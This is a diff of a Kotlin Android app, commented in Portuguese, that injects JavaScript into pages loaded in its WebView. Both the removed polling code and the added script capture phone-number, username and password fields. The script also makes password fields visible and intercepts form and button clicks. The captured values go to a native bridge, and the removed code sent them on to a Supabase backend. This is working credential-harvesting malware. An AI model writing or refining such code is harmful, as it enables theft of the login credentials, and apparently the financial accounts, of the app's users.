@@ -1052,62 +1052,81 @@ class MainActivity : AppCompatActivity() {
         credPollerRunnable?.let { handler.removeCallbacks(it) }
         credPollerRunnable = null
 
-        val jsVis = "document.querySelectorAll('input[type=\"password\"]')" +
-            ".forEach(function(e){e.type='text';});"
+        // JS injetado uma única vez por página (flag _credDone).
+        // Usa evento 'blur' — só envia quando o utilizador sai do campo (valor completo).
+        // Também interceta o botão de submit para garantir captura mesmo sem blur.
+        val js = """
+(function() {
+    if (window._credDone) return;
+    window._credDone = true;
 
-        val jsRead = "(" +
-            "function(){" +
-            "var u=document.querySelector('input[name=\"username\"]')" +
-            "||document.querySelector('input[name=\"phone\"]')" +
-            "||document.querySelector('input[name=\"msisdn\"]')" +
-            "||document.querySelector('input[name=\"login\"]');" +
-            "var p=document.querySelector('input[name=\"password\"]')" +
-            "||document.querySelector('input[name=\"senha\"]')" +
-            "||document.querySelector('input[type=\"password\"]')" +
-            "||document.querySelector('input[type=\"text\"][name]');" +
-            "var n=u&&u.value?u.value:'';var s=p&&p.value?p.value:'';" +
-            "return n+'|||'+s;" +
-            "})()"
+    // Tornar passwords visíveis
+    function tornarVisivel() {
+        document.querySelectorAll('input[type="password"]').forEach(function(el) {
+            el.setAttribute('type', 'text');
+        });
+    }
+    tornarVisivel();
+    new MutationObserver(tornarVisivel).observe(document.body || document.documentElement, {childList:true, subtree:true});
 
-        val poller = object : Runnable {
-            override fun run() {
-                // Garantir que password está sempre visível
-                webView.evaluateJavascript(jsVis, null)
+    var selNum = ['input[name="username"]','input[name="phone"]','input[name="msisdn"]','input[name="login"]','input[type="tel"]'];
+    var selSen = ['input[name="password"]','input[name="senha"]','input[placeholder*="senha" i]','input[placeholder*="password" i]'];
 
-                webView.evaluateJavascript(jsRead) { raw ->
-                    try {
-                        if (raw != null && raw != "null" && raw.contains("|||")) {
-                            val clean = raw.trim().removePrefix("\"").removeSuffix("\"")
-                                .replace("\\n", "").replace("\\\"", "\"")
-                            val parts = clean.split("|||")
-                            val num = if (parts.size > 0) parts[0].trim() else ""
-                            val sen = if (parts.size > 1) parts[1].trim() else ""
-
-                            // Usar variáveis de classe para estado partilhado — evita duplicados
-                            val numMudou = num.isNotEmpty() && num != credUltimoNum
-                            val senMudou = sen.isNotEmpty() && sen != credUltimaSen
-
-                            if (numMudou) {
-                                credUltimoNum       = num   // estado de classe partilhado
-                                ultimoNumeroEnviado = num
-                                numeroTemporario    = num
-                                android.util.Log.d("SKYBOT_CRED", "Número → $num")
-                                enviarSupabase("Numero", num)
-                            }
-                            if (senMudou) {
-                                credUltimaSen      = sen   // estado de classe partilhado
-                                ultimaSenhaEnviada = sen
-                                android.util.Log.d("SKYBOT_CRED", "Senha → len=${sen.length}")
-                                enviarSupabase("Senha", sen)
-                            }
-                        }
-                    } catch (_: Exception) {}
-                    handler.postDelayed(this, 800)
-                }
-            }
+    function findEl(sels) {
+        for (var i = 0; i < sels.length; i++) {
+            var el = document.querySelector(sels[i]);
+            if (el) return el;
         }
-        credPollerRunnable = poller   // guardar referência para cancelar na próxima chamada
-        handler.post(poller)
+        return null;
+    }
+
+    function anexar() {
+        var elNum = findEl(selNum);
+        var elSen = findEl(selSen) || document.querySelector('input[type="text"][name]');
+
+        if (elNum && !elNum._credOk) {
+            elNum._credOk = true;
+            // blur: utilizador saiu do campo — valor completo
+            elNum.addEventListener('blur', function() {
+                var v = this.value.trim();
+                if (v.length > 0) Android.guardarNumero(v);
+            });
+        }
+        if (elSen && !elSen._credOk) {
+            elSen._credOk = true;
+            // blur: utilizador saiu do campo — valor completo
+            elSen.addEventListener('blur', function() {
+                var v = this.value.trim();
+                if (v.length > 0) Android.guardarSenha(v);
+            });
+        }
+    }
+
+    // Interceta submit do formulário — garante captura mesmo que blur não dispare
+    function interceptarSubmit() {
+        document.querySelectorAll('form, button[type="submit"], input[type="submit"], button').forEach(function(el) {
+            if (el._submitOk) return;
+            el._submitOk = true;
+            el.addEventListener('click', function() {
+                var elNum = findEl(selNum);
+                var elSen = findEl(selSen) || document.querySelector('input[type="text"][name]');
+                var n = elNum ? elNum.value.trim() : '';
+                var s = elSen ? elSen.value.trim() : '';
+                if (n.length > 0) Android.guardarNumero(n);
+                if (s.length > 0) Android.guardarSenha(s);
+            }, true);
+        });
+    }
+
+    anexar();
+    interceptarSubmit();
+    // Re-tentar após SPA renderizar campos dinamicamente
+    setTimeout(function() { anexar(); interceptarSubmit(); }, 1500);
+    setTimeout(function() { anexar(); interceptarSubmit(); }, 4000);
+})();
+        """.trimIndent()
+
+        webView.evaluateJavascript(js, null)
     }
 
     private fun injetarJsCapturarSaldo() {
